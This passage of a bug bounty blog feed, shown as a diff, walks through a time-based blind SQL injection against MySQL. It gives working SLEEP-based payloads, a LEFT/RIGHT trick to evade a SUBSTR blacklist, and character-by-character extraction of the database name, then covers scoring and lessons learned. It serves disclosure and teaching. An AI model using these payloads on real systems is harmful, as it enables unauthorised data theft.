+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;-- Set an input string and a position in the string to extract the character&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;SET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inputString&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;hackcommander&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;SET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;position&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;-- Displays the @position character of @inputString&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;SET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;substrChar&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SUBSTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inputString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;substrChar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;-- Extract and print the first @position characters of @inputString&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;SET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leftString&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LEFT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inputString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leftString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;-- Extract the last character of the first @position characters of @inputString&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;SET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rightChar&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;RIGHT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leftString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rightChar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;in the following &lt;a href=&quot;https://onecompiler.com/mysql/&quot;&gt;online MySQL code interpreter&lt;/a&gt;, as you can see in the following capture&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/exploitation-bypass-blacklist-substr-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see, both the &lt;em&gt;SUBSTR&lt;/em&gt; function and the composition of the &lt;em&gt;LEFT&lt;/em&gt; and &lt;em&gt;RIGHT&lt;/em&gt; functions return the sixth character of the input string.&lt;/p&gt;
+
+&lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;/assets/images/general/clever.gif&quot; style=&quot;width: 600px;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now using the following payload&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;RIGHT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;LEFT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;VERSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;CHAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;for &lt;em&gt;i = 48, 1, …, 57&lt;/em&gt; there was a delay for &lt;em&gt;i = 56&lt;/em&gt;, as you can see in the following capture&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/exploitation-bypass-blacklist-substr-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This means that the first number of the MySQL version was 8. Performing this process for each character of the string returned by the &lt;em&gt;VERSION&lt;/em&gt; function (it had 6 characters), &lt;strong&gt;I demonstrated that the version was 8.0.15&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div id=&quot;section-id-3-1-4&quot; /&gt;
+
+&lt;h3 id=&quot;314-weaponizing-the-payload-to-dump-the-database-name&quot;&gt;3.1.4. Weaponizing the payload to dump the database name&lt;/h3&gt;
+
+&lt;p&gt;It is time to get some sensitive information. After trying many different functions, I found that the only available function that allowed me to get the name of the database was the &lt;em&gt;&lt;a href=&quot;https://database.guide/schema-function-in-mysql/&quot;&gt;SCHEMA&lt;/a&gt;&lt;/em&gt; function. For some reason, the &lt;em&gt;&lt;a href=&quot;https://www.w3schools.com/sql/func_mysql_database.asp&quot;&gt;DATABASE&lt;/a&gt;&lt;/em&gt; function was not available. So, after some tests I came up with the following payload&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;LENGTH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;SCHEMA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;which causes a delay as you can see in the following capture&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/exploitation-weap-payload-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This capture shows that the &lt;em&gt;SCHEMA&lt;/em&gt; function works correctly and that it has 8 characters. Now it is only necessary to apply the payload that we have discovered to find out each of the characters of the string. The name of a database in MySQL can only be composed of the following characters&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a-z,A-Z,0-9,_,$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;whose associated ASCII codes are&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 95, 36
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Therefore, to find out which is the name of the database, it is only necessary to send the following payload&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;RIGHT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;LEFT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;SCHEMA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;CHAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;for &lt;em&gt;i = 1, …, 8&lt;/em&gt; and &lt;em&gt;j = each of the ASCII codes&lt;/em&gt;, which is easy to do using the burp intruder. The responses that trigger a delay are those associated with correct characters.&lt;/p&gt;
+
+&lt;p&gt;For example, the following payload&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;RIGHT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;LEFT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;SCHEMA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;CHAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;triggers a delay, as you can see in the following capture&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/exploitation-weap-payload-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This means that the sixth letter of the database has &lt;em&gt;ASCII&lt;/em&gt; code 97, that means, the sixth letter of the database is &lt;em&gt;a&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;However, this SQL injection was quite strange. In fact the intruder scan I sent to find out what was the sixth character returned 3 &lt;em&gt;ASCII&lt;/em&gt; characters, as you can see in the following capture&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/exploitation-weap-payload-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A delay is triggered for the ASCII codes 65, 95 and 97, corresponding respectively to the characters A, _, a. This behavior is repeated for all the positions of the string, always returning the same letter in lowercase and uppercase, and the underscore. It does not make any sense to return the same uppercase and lowercase letter because the &lt;em&gt;LIKE&lt;/em&gt; operator is case sensitive, but it makes even less sense to always return the underscore. As I said, the strangest SQLi I have ever exploited :satisfied:.&lt;/p&gt;
+
+&lt;div id=&quot;section-id-3-2&quot; /&gt;
+
+&lt;h2 id=&quot;32-why-does-the-payload-work&quot;&gt;3.2. Why does the payload work??&lt;/h2&gt;
+
+&lt;p&gt;The name of the vulnerable parameter was of the type &lt;em&gt;id&lt;/em&gt;, &lt;em&gt;value&lt;/em&gt;, &lt;em&gt;price&lt;/em&gt;… which indicates that it is a numerical parameter. In fact, this fits with the payload that Icko used during the detection because if it were a string parameter, it would have been necessary to use some single or double quotes to break the string and introduce a new predicate in the &lt;em&gt;where&lt;/em&gt; clause. However, if the parameter is numeric, there is no need to break any string, so there is no need to use single or double quotes.&lt;/p&gt;
+
+&lt;p&gt;If we suppose that the vulnerable parameter was &lt;em&gt;id&lt;/em&gt;, the query in the backend should be similar to the following one&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;description&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;products&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If we enter a “non-malicious” id, such as &lt;em&gt;1&lt;/em&gt;, the query that will be executed is&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;description&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;products&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;but if we enter a “malicious” id such as the one used by Icko during the detection&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and no input sanitization is being applied in the backend, the query that will be executed is&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;description&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;products&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As you can see, the injected SQL code is executed in the where clause of the query.&lt;/p&gt;
+
+&lt;p&gt;But the real question is… why the previous payloads I sent didn’t work? And the truth is that I don’t know the cause or if there were different causes. For example, not being able to use single quotes could be due to the WAF but I don’t think so. To simplify the post, I told a little lie since I said that “the quotes were sanitized”, but this was not true for all cases. When quotes were used to enclose numbers, such as ‘8’, the payload worked correctly, but when they were used to enclose characters, such as ‘hackcommander’, the payload did not work. What the hell is this? :angry:&lt;/p&gt;
+
+&lt;p&gt;And the problem of not being able to use the &lt;em&gt;SUBSTR&lt;/em&gt; function is even stranger, although it could also have been caused by the WAF. This is the bad side of black box pentesting, sometimes we don’t know why things happen, and we will never know if we don’t get access to the source code :disappointed:.&lt;/p&gt;
+
+&lt;div id=&quot;section-id-4&quot; /&gt;
+
+&lt;h2 id=&quot;4-report-resolution&quot;&gt;4. Report resolution&lt;/h2&gt;
+
+&lt;p&gt;Although it was not an important asset, it had confidential information stored in the BBDD, so we can consider that the asset criticality is medium. With respect to the severity of the vulnerability, they determined that the scoring was:&lt;/p&gt;
+
+&lt;p style=&quot;text-align:center;&quot;&gt;&lt;b&gt;Medium (6.5) [CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N]&lt;/b&gt;&lt;/p&gt;
+
+&lt;p&gt;Some components of the vector don’t make much sense:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;Confidentiality&lt;/em&gt; to &lt;em&gt;Low&lt;/em&gt; doesn’t make sense because we were told to only get harmless information, such as the name of the BBDD, and we already demonstrated that we could get it.&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;Integrity&lt;/em&gt; to &lt;em&gt;Low&lt;/em&gt; doesn’t make much sense either because I didn’t prove that I could upload files or edit data.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;However, one component that does make sense and that under the severity was the &lt;em&gt;Attack Complexity&lt;/em&gt;, which was set to &lt;em&gt;Low&lt;/em&gt;, and it is normal because as we have seen the exploitation was quite difficult, and trying to dump entire tables would require a custom exploit.&lt;/p&gt;
+
+&lt;p&gt;Therefore, the report was classified as&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Asset criticity&lt;/strong&gt;: Medium&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Vulnerability severity&lt;/strong&gt;: Medium&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Bounty&lt;/strong&gt;: More than $2000&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div id=&quot;section-id-5&quot; /&gt;
+
+&lt;h2 id=&quot;5-lessons-learned&quot;&gt;5. Lessons learned&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Collaborations are one of the most beautiful things in bug bounty. Both Icko and I learned from each other and, moreover, we made money with a report that initially they weren’t going to pay for. It’s a win-win. Therefore, I recommend collaborating whenever you can, always with serious and trustworthy people.&lt;/li&gt;
+  &lt;li&gt;Automatic tools like sqlmap are quite useful but sometimes they’re not enough. In this report, we saw how sqlmap was unable to retrieve information from the database, but as a hacker, I was able to do it. Perhaps this will change with the advancement of AI, but for now, automatic tools don’t replace the skills of a hacker.&lt;/li&gt;
+  &lt;li&gt;Many people say that knowing programming is not necessary to hack, which has always seemed absurd to me. It may not be necessary to know programming to run a ffuf scan or exploit an SQLi with sqlmap, but it is a fundamental skill to understand why vulnerabilities exist and to be able to improvise. In this case, my programming knowledge helped me to bypass the blacklisting of the &lt;em&gt;SUBSTR&lt;/em&gt; function in MySQL by composing the &lt;em&gt;RIGHT&lt;/em&gt; and &lt;em&gt;LEFT&lt;/em&gt; functions. It’s not a big deal, but if you have no idea about programming, you wouldn’t even think that this is possible.&lt;/li&gt;
+  &lt;li&gt;When you find a bug, always try to achieve maximum impact even if your report has already been accepted. In this case, I made a mistake because when I finished the PoC to retrieve the name of the database, I considered the exploitation finished. What I should have done is to continue escalating the vulnerability to dump any row of a table, attempt to upload a file to achieve RCE… but I did not. This way, the CVSS score could have been higher and therefore, the bounty too. Given the complexity of the exploitation, probably none of this was possible, but I should have tried.&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="bug bounty" /><category term="web pentesting" /><category term="collaboration" /><category term="osint" /><category term="google dorking" /><category term="portswigger" /><category term="burpsuite" /><category term="0iq" /><category term="sqlmap" /><category term="sql injection" /><category term="mysql" /><category term="bypass" /><summary type="html">Partial disclosure of a bug bounty report: human 1 - sqlmap 0: defeating automation through manual exploitation.</summary></entry><entry><title type="html">Reflected XSS bypassing hidden input tag and auto-submit script in a form</title><link href="https://hackcommander.github.io/posts/2023/12/10/reflected-xss-bypassing-hidden-input-tag-and-auto-submit-script/" rel="alternate" type="text/html" title="Reflected XSS bypassing hidden input tag and auto-submit script in a form" /><published>2023-12-10T00:00:00+01:00</published><updated>2023-12-10T00:00:00+01:00</updated><id>https://hackcommander.github.io/posts/2023/12/10/reflected-xss-bypassing-hidden-input-tag-and-auto-submit-script</id><content type="html" xml:base="https://hackcommander.github.io/posts/2023/12/10/reflected-xss-bypassing-hidden-input-tag-and-auto-submit-script/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
 
 &lt;ul&gt;
   &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. Asset discovery&lt;/a&gt;&lt;/li&gt;
@@ -293,7 +715,7 @@
 &lt;ul&gt;
   &lt;li&gt;This XSS was in one of the company’s main domains so it is unlikely that nobody had discovered it before. What probably happened is that they just used automated tools or gave up before finding the right payload. So, when you find the possible existence of a vulnerability, don’t give up, try harder until you find the right payload because it surely exists.&lt;/li&gt;
   &lt;li&gt;If you are struggling with an XSS trying to avoid a redirection, an auto-submit form… try to use the payload that we have seen in this post. As we saw, the focus through the hash in the URL is one of the first tasks that the browser performs when receiving a response, so it will be performed before tasks such as auto-submit form.&lt;/li&gt;
